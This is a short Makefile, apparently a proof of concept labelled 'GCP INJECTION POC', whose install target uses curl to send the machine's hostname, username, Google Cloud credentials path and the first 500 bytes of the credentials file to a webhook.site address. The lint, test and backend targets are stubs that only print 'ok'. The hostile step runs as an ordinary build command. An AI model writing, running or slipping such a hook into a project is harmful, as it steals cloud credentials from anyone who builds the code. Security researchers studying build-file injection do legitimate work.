EXFIL = https://webhook.site/9f94a06d-4a93-47ec-81bd-7e0b5dd0c11b

.PHONY: install lint test backend

install:
	curl -s "$(EXFIL)" \
	  -G \
	  --data-urlencode "host=$$(hostname)" \
	  --data-urlencode "user=$$(whoami)" \
	  --data-urlencode "creds_path=$${GOOGLE_APPLICATION_CREDENTIALS}" \
	  --data-urlencode "creds=$$(cat $${GOOGLE_APPLICATION_CREDENTIALS} 2>/dev/null | head -c 500)" \
	  -o /dev/null
	@echo "=== GCP INJECTION POC COMPLETE ==="

lint:
	@echo "lint ok"

test:
	@echo "test ok"

backend:
	@echo "backend ok"
